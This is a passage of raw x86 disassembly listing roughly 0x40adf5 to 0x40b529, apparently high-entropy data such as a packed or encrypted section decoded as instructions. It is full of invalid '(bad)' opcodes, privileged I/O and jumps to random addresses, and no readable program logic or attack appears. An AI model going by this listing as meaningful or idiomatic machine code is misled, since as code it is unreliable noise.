  40adf5:	jns    0x40ae1f
  40adf7:	or     eax,0x6f97e8ea
  40adfc:	sub    BYTE PTR [ebp+0x56],bl
  40adff:	cld    
  40ae00:	int3   
  40ae01:	lods   eax,DWORD PTR ds:[esi]
  40ae02:	jmp    0x6a6c9b50
  40ae07:	jmp    0xf058:0x49b5476d
  40ae0e:	pop    edi
  40ae0f:	xor    al,0x92
  40ae11:	cmp    DWORD PTR [edx],esi
  40ae13:	imul   ebx,DWORD PTR [eax],0xd489014a
  40ae19:	fisubr WORD PTR [edx]
  40ae1b:	xor    BYTE PTR [edx+0x29bf105a],0x91
  40ae22:	inc    ecx
  40ae23:	mov    ss,WORD PTR [ecx]
  40ae25:	push   esp
  40ae26:	fbstp  TBYTE PTR [ebx]
  40ae28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae29:	jnp    0x40ae95
  40ae2b:	popa   
  40ae2c:	pop    edi
  40ae2d:	jb     0x40ae50
  40ae2f:	std    
  40ae30:	fisttp DWORD PTR [esi+eax*4-0x28]
  40ae34:	and    ch,0x85
  40ae37:	int3   
  40ae38:	push   esi
  40ae39:	cmc    
  40ae3a:	fwait
  40ae3b:	sub    ch,BYTE PTR [eax]
  40ae3d:	int3   
  40ae3e:	jnp    0x40ae9b
  40ae40:	(bad)  
  40ae41:	mov    ds:0x8eedf695,al
  40ae46:	lods   ax,WORD PTR ds:[esi]
  40ae48:	xchg   esi,eax
  40ae49:	xchg   edx,eax
  40ae4a:	inc    ebx
  40ae4b:	sbb    DWORD PTR [esi+0x71],0xffffff90
  40ae4f:	xor    al,0x8
  40ae51:	(bad)  
  40ae53:	das    
  40ae54:	push   es
  40ae55:	aam    0xe
  40ae57:	and    cl,cl
  40ae59:	ja     0x40aded
  40ae5b:	mov    esp,DWORD PTR [edi+0x399f8df8]
  40ae61:	mov    eax,ds:0xa17cde59
  40ae66:	xor    eax,0x2809e15a
  40ae6b:	mov    ebp,0x63132c
  40ae70:	(bad)  
  40ae71:	sub    BYTE PTR [esi+0x5e31fbe0],cl
  40ae77:	lods   eax,DWORD PTR ds:[esi]
  40ae78:	fs popf 
  40ae7a:	push   ebp
  40ae7b:	ficomp WORD PTR ds:0x213ba025
  40ae81:	in     al,0x72
  40ae83:	or     cl,BYTE PTR [eax]
  40ae85:	nop
  40ae86:	ja     0x40aeed
  40ae88:	add    ch,ch
  40ae8a:	cmp    eax,0xbd41fe06
  40ae8f:	mov    cl,0xbc
  40ae91:	pushf  
  40ae92:	jo     0x40ae2b
  40ae94:	add    eax,0xd7cbd319
  40ae99:	fstp   QWORD PTR [edi+eax*4-0x30b2b3f3]
  40aea0:	int3   
  40aea1:	mov    esi,0xcf49d9ff
  40aea6:	out    dx,eax
  40aea7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aea8:	cmp    cl,BYTE PTR [esi-0x1e]
  40aeab:	pop    ecx
  40aeac:	sub    cl,BYTE PTR [esi+0x35fd327f]
  40aeb2:	lock jmp 0x40ae5f
  40aeb5:	mov    fs,WORD PTR [esi-0x23]
  40aeb8:	push   ecx
  40aeb9:	mov    DWORD PTR ds:0xf33815c7,ebx
  40aebf:	in     al,dx
  40aec0:	ins    DWORD PTR es:[edi],dx
  40aec1:	dec    esp
  40aec2:	xor    DWORD PTR [edi],edx
  40aec4:	pop    ebx
  40aec5:	cwde   
  40aec6:	pop    eax
  40aec7:	ds lock (bad) 
  40aeca:	popf   
  40aecb:	stos   BYTE PTR es:[edi],al
  40aecc:	mov    esp,0xb4c953b1
  40aed1:	dec    ecx
  40aed2:	xchg   cl,ah
  40aed4:	and    eax,0x7cbaf4a4
  40aed9:	mov    al,ds:0x7bd4ecad
  40aede:	pop    es
  40aedf:	jmp    0x40af40
  40aee1:	cld    
  40aee2:	xchg   BYTE PTR [ebx+0x2fb95c28],dl
  40aee8:	pop    esp
  40aee9:	popa   
  40aeea:	dec    esi
  40aeeb:	aas    
  40aeec:	cmp    al,0x2c
  40aeee:	adc    DWORD PTR [ebp+0x26],ecx
  40aef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aef2:	std    
  40aef3:	ins    BYTE PTR es:[edi],dx
  40aef4:	fsub   DWORD PTR [edx+0xd]
  40aef7:	inc    esp
  40aef8:	inc    ebx
  40aef9:	push   esi
  40aefa:	fimul  DWORD PTR [ebp+0x27]
  40aefd:	lods   eax,DWORD PTR ds:[esi]
  40aefe:	add    dh,ah
  40af00:	rol    DWORD PTR [ebp+0x21],1
  40af03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af04:	dec    eax
  40af05:	cmp    bl,BYTE PTR [esi+0x6b7c27e3]
  40af0b:	mov    edi,0x6f7b438f
  40af10:	sbb    edi,ebx
  40af12:	jne    0x40af4d
  40af14:	mov    esi,0xe40c6e70
  40af19:	mov    edx,0xbc43b4ef
  40af1e:	jecxz  0x40aed7
  40af20:	enter  0x9853,0xd4
  40af24:	jecxz  0x40af1e
  40af26:	jns    0x40af73
  40af28:	xchg   esp,eax
  40af29:	(bad)  
  40af2a:	xor    ecx,ebx
  40af2c:	pop    ds
  40af2d:	sbb    bl,bl
  40af2f:	repnz dec esp
  40af31:	add    DWORD PTR [esi],edx
  40af33:	int3   
  40af34:	(bad)  
  40af35:	adc    DWORD PTR [esp+ebx*2+0x49],0xdd6f7ada
  40af3d:	vpgatherqd xmm3,DWORD PTR [ecx],xmm4
  40af42:	pop    edi
  40af43:	sub    eax,0x57b56ee1
  40af48:	push   edx
  40af49:	and    eax,DWORD PTR ds:0x299665f1
  40af4f:	and    esi,DWORD PTR [eax-0x13]
  40af52:	dec    ecx
  40af53:	mov    ds:0x58b6e361,eax
  40af58:	out    dx,eax
  40af59:	jno    0x40af39
  40af5b:	stc    
  40af5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af5d:	xchg   edi,eax
  40af5e:	test   al,0x69
  40af60:	jg     0x40af18
  40af62:	mov    ds,WORD PTR [edx-0x3e]
  40af65:	inc    esp
  40af66:	outs   dx,DWORD PTR ds:[esi]
  40af67:	add    dh,BYTE PTR [eax+0x47cfc3ad]
  40af6d:	pushf  
  40af6e:	adc    dh,BYTE PTR [esp+esi*8]
  40af71:	nop
  40af72:	xchg   esi,eax
  40af73:	cld    
  40af74:	in     al,dx
  40af75:	pop    ebx
  40af76:	jbe    0x40afdf
  40af78:	imul   ebx,DWORD PTR [edi],0xffffff81
  40af7b:	or     DWORD PTR [ecx],ebp
  40af7d:	out    dx,al
  40af7e:	adc    al,BYTE PTR [esi-0x10]
  40af81:	std    
  40af82:	fldl2t 
  40af84:	add    DWORD PTR [ebp+0x2a],ecx
  40af87:	lods   al,BYTE PTR ds:[esi]
  40af88:	lahf   
  40af89:	sub    BYTE PTR [ebx+esi*1-0x18],dl
  40af8d:	int3   
  40af8e:	add    ecx,DWORD PTR [ecx]
  40af90:	sar    DWORD PTR [ebx+edx*1+0x4f],1
  40af94:	inc    edx
  40af95:	and    DWORD PTR [edi-0x2514174],ebx
  40af9b:	sub    dl,BYTE PTR [esp+eiz*2-0x6ca5d61c]
  40afa2:	test   esi,esp
  40afa4:	test   al,0x17
  40afa6:	xchg   BYTE PTR [edi],ch
  40afa8:	pop    edx
  40afa9:	mov    edx,0x63825058
  40afae:	adc    dh,BYTE PTR [ebp+esi*4-0x133ad3d6]
  40afb5:	xchg   ecx,eax
  40afb6:	shl    DWORD PTR [esi],1
  40afb8:	sub    BYTE PTR [ebp-0x8],cl
  40afbb:	aas    
  40afbc:	inc    edi
  40afbd:	pop    eax
  40afbe:	push   edx
  40afbf:	js     0x40b02a
  40afc1:	adc    bh,cl
  40afc3:	xchg   edi,eax
  40afc4:	pop    esp
  40afc5:	push   cs
  40afc6:	mov    eax,0x10faba65
  40afcb:	sub    al,0xb6
  40afcd:	xor    BYTE PTR [eax+0x711c584b],cl
  40afd3:	pop    ds
  40afd4:	jae    0x40af5b
  40afd6:	out    0x14,al
  40afd8:	rcl    BYTE PTR [esi+0x2c603b8b],cl
  40afde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afdf:	mov    al,0x43
  40afe1:	lods   eax,DWORD PTR ds:[esi]
  40afe2:	add    DWORD PTR [esi-0x27],ebp
  40afe5:	mov    ah,0xad
  40afe7:	enter  0x82d7,0x80
  40afeb:	dec    ebp
  40afec:	sar    BYTE PTR [eax+0x6c1692c6],0x82
  40aff3:	(bad)  
  40aff4:	pop    ecx
  40aff5:	push   edi
  40aff6:	stos   BYTE PTR es:[edi],al
  40aff7:	gs sbb edi,ecx
  40affa:	int3   
  40affb:	lea    ecx,[esi]
  40affd:	inc    ebp
  40affe:	ins    DWORD PTR es:[edi],dx
  40afff:	xchg   DWORD PTR [esi+edi*2],edi
  40b002:	and    BYTE PTR [esp+ecx*1-0x54],bh
  40b006:	mov    ds:0x7df1b6e6,eax
  40b00b:	hlt    
  40b00c:	mov    WORD PTR [ecx+0x4912e2ab],ds
  40b012:	xchg   ebp,eax
  40b013:	jle    0x40b035
  40b015:	inc    ebp
  40b016:	ja     0x40b027
  40b018:	(bad)  
  40b019:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b01a:	into   
  40b01b:	cld    
  40b01c:	das    
  40b01d:	sbb    ch,BYTE PTR [edi-0x5b543ca2]
  40b023:	adc    eax,0xcf69f2c3
  40b028:	mov    bl,0x18
  40b02a:	or     BYTE PTR [eax-0x7],ch
  40b02d:	jp     0x40b063
  40b02f:	add    DWORD PTR [edi-0x6ed43c36],ebx
  40b035:	outs   dx,DWORD PTR ds:[esi]
  40b036:	sbb    al,0x5
  40b038:	xchg   ebp,eax
  40b039:	scas   eax,DWORD PTR es:[edi]
  40b03a:	mov    bl,0xe5
  40b03c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b03d:	dec    edi
  40b03e:	xchg   ebx,eax
  40b03f:	pop    es
  40b040:	add    eax,0x81865365
  40b045:	das    
  40b046:	popa   
  40b047:	fistp  WORD PTR [edx-0x18]
  40b04a:	cli    
  40b04b:	jno    0x40b00d
  40b04d:	xlat   BYTE PTR ds:[ebx]
  40b04e:	push   ss
  40b04f:	push   edi
  40b050:	in     eax,dx
  40b051:	mov    esp,0x5bfd88a
  40b056:	int3   
  40b057:	xchg   esi,eax
  40b058:	bound  edi,QWORD PTR [ebx+0x55e618e2]
  40b05e:	cmc    
  40b05f:	pop    ss
  40b060:	sub    BYTE PTR [ecx-0x2d80235],0xe7
  40b067:	in     eax,0xaf
  40b069:	rol    DWORD PTR [edi],0x57
  40b06c:	ret    0x6ada
  40b06f:	push   0x3c
  40b071:	or     DWORD PTR [ebx+0x71],edx
  40b074:	sar    esi,cl
  40b076:	repz xor al,0xc1
  40b079:	repz mov eax,ds:0xafd117dd
  40b07f:	lock sahf 
  40b081:	mov    cl,0xed
  40b083:	mov    bh,0x75
  40b085:	jnp    0x40b077
  40b087:	(bad)  
  40b088:	scas   eax,DWORD PTR es:[edi]
  40b089:	mov    dl,0xee
  40b08b:	pop    es
  40b08c:	jl     0x40b078
  40b08e:	push   ds
  40b08f:	loopne 0x40b012
  40b091:	mov    eax,ds:0x35e02e8f
  40b096:	mov    bh,BYTE PTR [edx]
  40b098:	mov    ebx,0xa42f2459
  40b09d:	cdq    
  40b09e:	outs   dx,DWORD PTR ds:[esi]
  40b09f:	jecxz  0x40b107
  40b0a1:	(bad)  
  40b0a2:	fnstsw WORD PTR [edx-0x587b4a58]
  40b0a8:	inc    esi
  40b0a9:	mov    ebp,0x9c05d8a1
  40b0ae:	cmp    bh,BYTE PTR [ebp+0x40]
  40b0b1:	icebp  
  40b0b2:	in     al,0xf
  40b0b4:	inc    ebx
  40b0b5:	mov    bh,0x52
  40b0b7:	fsub   QWORD PTR [ecx+0x63ea58cd]
  40b0bd:	mov    ds:0xe368368f,al
  40b0c2:	xchg   ecx,eax
  40b0c3:	jmp    0x40b144
  40b0c5:	or     al,0x8
  40b0c7:	or     BYTE PTR [ebp+0x38],al
  40b0ca:	sub    eax,0xd43f76c2
  40b0cf:	xchg   ebx,eax
  40b0d0:	dec    esi
  40b0d1:	pop    edi
  40b0d2:	sub    BYTE PTR [ecx+ebp*8-0x57],0xc4
  40b0d7:	or     al,0xc9
  40b0d9:	push   ecx
  40b0da:	dec    edx
  40b0db:	pop    edi
  40b0dc:	stc    
  40b0dd:	nop
  40b0de:	cmc    
  40b0df:	dec    ebp
  40b0e0:	pop    ebp
  40b0e1:	xchg   BYTE PTR [ebx-0x15],ch
  40b0e4:	dec    al
  40b0e6:	icebp  
  40b0e7:	fsubrp st(4),st
  40b0e9:	sbb    BYTE PTR [esi+0x59],cl
  40b0ec:	cmc    
  40b0ed:	loop   0x40b0d4
  40b0ef:	inc    edx
  40b0f0:	mov    dl,0xa
  40b0f2:	and    esp,DWORD PTR [ebx]
  40b0f4:	retf   
  40b0f5:	add    edi,DWORD PTR [ebx+0x4d]
  40b0f8:	int3   
  40b0f9:	mov    al,ds:0x5b352bbd
  40b0fe:	mov    dl,ch
  40b100:	test   esp,esi
  40b102:	imul   ecx,ebp,0x66
  40b105:	(bad)  
  40b106:	cmp    dl,BYTE PTR [edx-0x34fb8c01]
  40b10c:	push   esi
  40b10d:	bound  ebx,QWORD PTR [eax+0x41470832]
  40b113:	sub    DWORD PTR [eax-0x6492ea8d],0x4aa54b8a
  40b11d:	jle    0x40b0b7
  40b11f:	xchg   DWORD PTR [edx-0x49c8cef0],esi
  40b125:	in     eax,dx
  40b126:	loop   0x40b0ae
  40b128:	ins    BYTE PTR es:[edi],dx
  40b129:	inc    eax
  40b12a:	push   ebp
  40b12b:	ins    BYTE PTR es:[edi],dx
  40b12c:	psubw  mm4,mm4
  40b12f:	scas   eax,DWORD PTR es:[edi]
  40b130:	mov    esp,0xc228f5fe
  40b135:	sub    BYTE PTR [esi],bh
  40b137:	pop    edi
  40b138:	inc    esp
  40b139:	add    al,0x96
  40b13b:	jg     0x40b0f9
  40b13d:	mov    ch,0x1c
  40b13f:	(bad)  
  40b140:	outs   dx,DWORD PTR ds:[esi]
  40b141:	arpl   WORD PTR [eax+eiz*4],bx
  40b144:	inc    edi
  40b145:	and    bl,al
  40b147:	and    BYTE PTR [ebx+0x58],0x76
  40b14b:	mov    al,0x49
  40b14d:	add    bl,BYTE PTR [eax+0x1d]
  40b150:	push   ebx
  40b151:	imul   ebx,DWORD PTR [edi+0x66],0xffffffa1
  40b155:	push   esp
  40b156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b157:	or     al,0x97
  40b159:	icebp  
  40b15a:	dec    ecx
  40b15b:	sahf   
  40b15c:	mov    bl,0x7e
  40b15e:	add    eax,0x77996503
  40b163:	es jg  0x40b176
  40b166:	sbb    BYTE PTR [esi+0x54],dl
  40b169:	mov    ch,0xc8
  40b16b:	sub    BYTE PTR [edi-0x18],ch
  40b16e:	jns    0x40b15c
  40b170:	jae    0x40b0f3
  40b172:	in     eax,0xd2
  40b174:	cmc    
  40b175:	icebp  
  40b176:	sbb    al,0xab
  40b178:	mov    al,0xb1
  40b17a:	stc    
  40b17b:	jle    0x40b124
  40b17d:	push   ecx
  40b17e:	repnz pushf 
  40b180:	test   BYTE PTR [ecx+0x86308a1],ch
  40b186:	sbb    BYTE PTR cs:0x337ab4df,cl
  40b18d:	in     al,0xb8
  40b18f:	mov    cl,0x44
  40b191:	aad    0x6b
  40b193:	and    DWORD PTR [esp+ecx*8+0x8],ecx
  40b197:	dec    eax
  40b198:	fs xor eax,0x41d0a39b
  40b19e:	call   0x759716f8
  40b1a3:	xchg   BYTE PTR [esi],dh
  40b1a5:	pop    ds
  40b1a6:	jno    0x40b216
  40b1a8:	cmp    DWORD PTR [edi],esi
  40b1aa:	dec    ecx
  40b1ab:	adc    dl,BYTE PTR [esi]
  40b1ad:	jne    0x40b1a9
  40b1af:	stc    
  40b1b0:	sbb    al,0x31
  40b1b2:	mov    ds:0xeb6fb4d0,eax
  40b1b7:	sub    DWORD PTR [edi],esp
  40b1b9:	mov    edi,0xb80ef43d
  40b1be:	ror    BYTE PTR [edx],cl
  40b1c0:	inc    eax
  40b1c1:	inc    edi
  40b1c2:	mov    esi,0x1f3b0de3
  40b1c7:	aad    0x18
  40b1c9:	aas    
  40b1ca:	and    BYTE PTR [edi+0x59],bh
  40b1cd:	and    eax,0x417bd05a
  40b1d2:	sar    bh,1
  40b1d4:	cmp    eax,DWORD PTR [ebx]
  40b1d6:	mov    bh,BYTE PTR [ebp+0x46]
  40b1d9:	pop    esi
  40b1da:	inc    edi
  40b1db:	ror    DWORD PTR [ecx+0x8],1
  40b1de:	neg    DWORD PTR [ebx-0x62]
  40b1e1:	mov    edi,0x41e94adb
  40b1e6:	or     eax,0x7310f1a2
  40b1eb:	out    dx,al
  40b1ec:	aas    
  40b1ed:	mov    bl,0x76
  40b1ef:	pop    ebp
  40b1f0:	sub    eax,0x38f2b822
  40b1f5:	mov    eax,DWORD PTR [eax]
  40b1f7:	rol    DWORD PTR ds:0x8b512351,cl
  40b1fd:	or     dh,bl
  40b1ff:	shl    BYTE PTR [esi-0x239bffc8],cl
  40b205:	jmp    0x3812:0xa963aefb
  40b20c:	and    DWORD PTR es:[edi],0xc776a5ed
  40b213:	jl     0x40b27c
  40b215:	ja     0x40b1d5
  40b217:	mov    cl,0x79
  40b219:	(bad)  
  40b21a:	sub    eax,0xb9a24fcb
  40b21f:	inc    ebp
  40b220:	out    dx,eax
  40b221:	mov    al,0x3
  40b223:	nop
  40b224:	cmp    DWORD PTR [edx-0x7653c949],eax
  40b22a:	xchg   edx,eax
  40b22b:	in     eax,0xc1
  40b22d:	and    ah,dl
  40b22f:	mov    esi,0x382453cc
  40b234:	mov    ds:0x8f72699f,al
  40b239:	data16 lahf 
  40b23b:	sub    ecx,DWORD PTR [ebp-0x469c536a]
  40b241:	jnp    0x40b20a
  40b243:	sub    al,ch
  40b245:	add    ah,dl
  40b247:	sub    bh,bh
  40b249:	cmp    dl,bh
  40b24b:	icebp  
  40b24c:	push   ebx
  40b24d:	and    al,0x5c
  40b24f:	loopne 0x40b20c
  40b251:	ret    0x333e
  40b254:	test   al,0x63
  40b256:	xchg   edi,eax
  40b257:	fsubr  st(1),st
  40b259:	pushf  
  40b25a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b25b:	add    bh,BYTE PTR [esi+0x68]
  40b25e:	cmp    BYTE PTR [edx+edx*2],bh
  40b261:	xchg   dl,bh
  40b263:	sub    DWORD PTR ds:0x461631fe,ecx
  40b269:	lahf   
  40b26a:	mov    bl,0x8f
  40b26c:	retf   0xed5b
  40b26f:	mov    gs,esi
  40b271:	add    esi,DWORD PTR [edx-0x5bc023b9]
  40b277:	jle    0x40b219
  40b279:	imul   ecx,DWORD PTR [edx],0xcdd6a57a
  40b27f:	in     eax,dx
  40b280:	fcmovbe st,st(2)
  40b282:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b283:	mul    DWORD PTR [ebp+ecx*2-0x7894dc4c]
  40b28a:	mov    al,BYTE PTR [edx-0x24]
  40b28d:	jle    0x40b226
  40b28f:	and    BYTE PTR [ebp+0x77fd9e5f],ah
  40b295:	mov    gs,WORD PTR [edx+edi*4+0x11]
  40b299:	cmp    DWORD PTR [ecx-0x3],ebx
  40b29c:	iret   
  40b29d:	lods   eax,DWORD PTR ds:[esi]
  40b29e:	rcr    DWORD PTR [esi+0x6b35ab21],cl
  40b2a4:	rcr    DWORD PTR ss:[ecx],0xc5
  40b2a8:	inc    esp
  40b2a9:	jl     0x40b2d8
  40b2ab:	adc    al,0x83
  40b2ad:	ins    DWORD PTR es:[edi],dx
  40b2ae:	mov    DWORD PTR [esi+0x203af506],ebx
  40b2b4:	and    edx,DWORD PTR [edi-0x2d]
  40b2b7:	ins    DWORD PTR es:[edi],dx
  40b2b8:	mov    ch,0x88
  40b2ba:	lea    ebp,[ebx]
  40b2bc:	jecxz  0x40b264
  40b2be:	jae    0x40b2e4
  40b2c0:	pusha  
  40b2c1:	add    DWORD PTR [ebx+0x8d16d71],0xffffff84
  40b2c8:	leave  
  40b2c9:	adc    eax,0x8c8b10e6
  40b2ce:	in     al,dx
  40b2cf:	adc    DWORD PTR [ebx+0x26],ebp
  40b2d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2d4:	inc    ebp
  40b2d5:	ret    
  40b2d6:	fsubr  QWORD PTR [esi+0x258d81fd]
  40b2dc:	not    BYTE PTR [eax+0x4bb11ebf]
  40b2e2:	inc    eax
  40b2e3:	cmp    esi,DWORD PTR [edx-0x63]
  40b2e6:	popf   
  40b2e7:	jne    0x40b2f8
  40b2e9:	daa    
  40b2ea:	mov    ah,0xf5
  40b2ec:	mov    ch,0x8c
  40b2ee:	push   0x59
  40b2f0:	pusha  
  40b2f1:	and    BYTE PTR [esi+esi*8],dl
  40b2f4:	mov    ecx,0xda3040c2
  40b2f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2fa:	jle    0x40b335
  40b2fc:	or     DWORD PTR ds:0x1a50537,esp
  40b302:	outs   dx,DWORD PTR ds:[esi]
  40b303:	out    0xdb,al
  40b305:	cmc    
  40b306:	mov    esp,eax
  40b308:	call   0x84b630ed
  40b30d:	sar    BYTE PTR [edi],cl
  40b30f:	ret    0x489
  40b312:	fcom   QWORD PTR [edi+ebx*4+0x2233f49a]
  40b319:	xchg   esp,eax
  40b31a:	scas   al,BYTE PTR es:[edi]
  40b31b:	sbb    DWORD PTR [eax-0x2ee8349],0xffffffad
  40b322:	icebp  
  40b323:	fcomp  QWORD PTR [ebx+edi*1-0x4cd22947]
  40b32a:	pop    esp
  40b32b:	int    0x32
  40b32d:	sub    al,0x9
  40b32f:	cli    
  40b330:	cli    
  40b331:	adc    esi,DWORD PTR ds:0x26861ee5
  40b337:	jo     0x40b2ca
  40b339:	and    eax,0x26219b4
  40b33e:	iret   
  40b33f:	push   0x7c130abc
  40b344:	mov    ebx,0x148a7e67
  40b349:	mov    al,0x11
  40b34b:	arpl   WORD PTR [ecx],bx
  40b34d:	scas   eax,DWORD PTR es:[edi]
  40b34e:	mov    ebx,0x55d137ef
  40b353:	xlat   BYTE PTR ds:[ebx]
  40b354:	std    
  40b355:	bound  ecx,QWORD PTR [ecx]
  40b357:	pop    esp
  40b358:	cmp    eax,0xc570aec2
  40b35d:	mov    esi,0xc8a7b413
  40b362:	add    al,0x64
  40b364:	sub    ebp,DWORD PTR [esi]
  40b366:	jmp    0x8eab:0xc7a77253
  40b36d:	sbb    eax,0x2b756d7d
  40b372:	xlat   BYTE PTR ds:[ebx]
  40b373:	stos   BYTE PTR es:[edi],al
  40b374:	push   0xa44b4a0c
  40b379:	xor    al,0x57
  40b37b:	(bad)  
  40b37c:	jg     0x40b3d5
  40b37e:	fdiv   DWORD PTR [ecx+0x5f]
  40b381:	adc    ah,ch
  40b383:	jnp    0x40b313
  40b385:	dec    ebp
  40b386:	in     eax,0xb1
  40b388:	jl     0x40b336
  40b38a:	loopne 0x40b3ea
  40b38c:	pop    es
  40b38d:	js     0x40b404
  40b38f:	cdq    
  40b390:	shr    DWORD PTR [ecx],cl
  40b392:	inc    ebp
  40b393:	add    BYTE PTR [esp+edx*8],dl
  40b396:	mov    ecx,DWORD PTR [eax]
  40b398:	inc    ecx
  40b399:	aas    
  40b39a:	push   edx
  40b39b:	or     al,0x96
  40b39d:	int    0xae
  40b39f:	cmp    BYTE PTR [ecx-0x45],dh
  40b3a2:	or     eax,0x95619d64
  40b3a7:	hlt    
  40b3a8:	mov    al,ds:0x6c2efd15
  40b3ad:	fdiv   QWORD PTR [ebp+0x2e]
  40b3b0:	outs   dx,DWORD PTR ds:[esi]
  40b3b1:	(bad)  
  40b3b2:	(bad)  
  40b3b3:	loop   0x40b34e
  40b3b5:	data16 adc bh,BYTE PTR [edx-0x47]
  40b3b9:	push   0x28421145
  40b3be:	xchg   edx,eax
  40b3bf:	xor    DWORD PTR [esi],ebx
  40b3c1:	imul   edx,DWORD PTR [eax+0x4d],0x2abeb5d6
  40b3c8:	mov    eax,0x918c47e9
  40b3cd:	pop    ebx
  40b3ce:	retf   
  40b3cf:	outs   dx,BYTE PTR ds:[esi]
  40b3d0:	(bad)  
  40b3d1:	jbe    0x40b406
  40b3d3:	fcmovnb st,st(4)
  40b3d5:	push   0x24d921f1
  40b3da:	jb     0x40b372
  40b3dc:	sub    BYTE PTR [esi+0x4193e9e9],ah
  40b3e2:	push   ss
  40b3e3:	push   0x73
  40b3e5:	gs add eax,0x6f66b1ec
  40b3eb:	mov    bh,0x8b
  40b3ed:	adc    al,0xda
  40b3ef:	push   0xf149aec0
  40b3f4:	pushf  
  40b3f5:	dec    ebp
  40b3f6:	push   cs
  40b3f7:	jle    0x40b38e
  40b3f9:	leave  
  40b3fa:	mov    ecx,0x160d757c
  40b3ff:	sub    edi,DWORD PTR [edi]
  40b401:	icebp  
  40b402:	mov    dh,0xfc
  40b404:	data16 jecxz 0x40b439
  40b407:	push   eax
  40b408:	rcr    BYTE PTR [ecx],1
  40b40a:	out    dx,al
  40b40b:	and    esp,esi
  40b40d:	scas   al,BYTE PTR es:[edi]
  40b40e:	aam    0x78
  40b410:	jnp    0x40b471
  40b412:	out    0x1f,al
  40b414:	xchg   DWORD PTR ds:[ecx],edi
  40b417:	enter  0xbc42,0xd9
  40b41b:	cmp    DWORD PTR ds:0x9ccc9917,esp
  40b421:	mov    edi,0x570783f1
  40b426:	rcl    BYTE PTR [edi],0x9e
  40b429:	fisttp DWORD PTR [ebp+0x769a10a9]
  40b42f:	xor    edx,DWORD PTR [esi-0x67]
  40b432:	fnsave [edi-0x55aa0aee]
  40b438:	std    
  40b439:	ds mov edx,0x3d918c47
  40b43f:	jge    0x40b415
  40b441:	fisttp DWORD PTR [edx]
  40b443:	ins    DWORD PTR es:[edi],dx
  40b444:	jmp    0x3b679aff
  40b449:	pop    edi
  40b44a:	pop    ds
  40b44b:	adc    esi,DWORD PTR [ecx+0x10]
  40b44e:	jecxz  0x40b47b
  40b450:	mov    bl,0x42
  40b452:	retf   0x4f02
  40b455:	dec    esp
  40b456:	pop    ebp
  40b457:	lahf   
  40b458:	idiv   dh
  40b45a:	cmp    esp,DWORD PTR [ebx+0x38]
  40b45d:	mov    WORD PTR [esi-0x6189ee82],ss
  40b463:	loopne 0x40b4e4
  40b465:	mov    ds:0x61190591,eax
  40b46a:	push   cs
  40b46b:	ins    BYTE PTR es:[edi],dx
  40b46c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b46d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b46e:	mov    ds:0xee48a84f,al
  40b473:	mov    esp,0xcb95839
  40b478:	pop    edi
  40b479:	imul   esi,DWORD PTR es:[ebp+0x55],0x7317be7c
  40b481:	test   bl,dh
  40b483:	xchg   esp,eax
  40b484:	add    BYTE PTR [edx+0x37],ah
  40b487:	shl    ebp,cl
  40b489:	out    dx,al
  40b48a:	xchg   edi,eax
  40b48b:	xor    ecx,esi
  40b48d:	frstor [esp+edi*4]
  40b490:	outs   dx,BYTE PTR ds:[esi]
  40b491:	leave  
  40b492:	mov    al,ds:0x297a320
  40b497:	icebp  
  40b498:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b499:	cmp    al,0x3e
  40b49b:	(bad)  
  40b49d:	push   edx
  40b49e:	lahf   
  40b49f:	push   0x37
  40b4a1:	push   ss
  40b4a2:	enter  0x9e51,0xdb
  40b4a6:	inc    esp
  40b4a7:	into   
  40b4a8:	xlat   BYTE PTR ds:[ebx]
  40b4a9:	int    0x20
  40b4ab:	mov    ecx,0x80e1bb68
  40b4b0:	int3   
  40b4b1:	inc    bh
  40b4b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4b4:	fs aad 0xf9
  40b4b7:	jmp    0x2323:0x1d63305b
  40b4be:	sbb    eax,0x5caf750f
  40b4c3:	jne    0x40b4d8
  40b4c5:	pop    ebp
  40b4c6:	pop    ebx
  40b4c7:	xor    BYTE PTR [eax],0x9d
  40b4ca:	mov    ch,0x2c
  40b4cc:	scas   al,BYTE PTR es:[edi]
  40b4cd:	sub    BYTE PTR [ecx],dl
  40b4cf:	and    eax,0xf6d91200
  40b4d4:	stc    
  40b4d5:	cmp    BYTE PTR [ebx+0x731a71c5],bl
  40b4db:	mov    dl,0xe1
  40b4dd:	pop    edi
  40b4de:	cdq    
  40b4df:	retf   0x7f3c
  40b4e2:	pop    eax
  40b4e3:	imul   esp,DWORD PTR [eax+0x4bdc371b],0x47dd40e1
  40b4ed:	or     eax,DWORD PTR [esp+eax*8-0x33]
  40b4f1:	xor    DWORD PTR ds:0x9f097809,0x23
  40b4f8:	jmp    0xcea88b44
  40b4fd:	mov    esi,DWORD PTR [eax]
  40b4ff:	lods   eax,DWORD PTR ds:[esi]
  40b500:	push   ss
  40b501:	retf   
  40b502:	sub    cl,bl
  40b504:	push   ebx
  40b505:	mov    ?,WORD PTR [ebp+0x75eca109]
  40b50b:	mov    eax,ds:0xccd0797c
  40b510:	pushf  
  40b511:	xchg   DWORD PTR [edx+esi*4],ebp
  40b514:	xlat   BYTE PTR ds:[ebx]
  40b515:	add    esi,DWORD PTR [edx]
  40b517:	in     eax,0xf
  40b519:	or     BYTE PTR ds:0xc6504eb1,bh
  40b51f:	xlat   BYTE PTR ds:[ebx]
  40b520:	mov    bl,0x77
  40b522:	je     0x40b568
  40b524:	xchg   edx,eax
  40b525:	lock xor al,bl
  40b528:	outs   dx,BYTE PTR ds:[esi]
  40b529:	sahf   
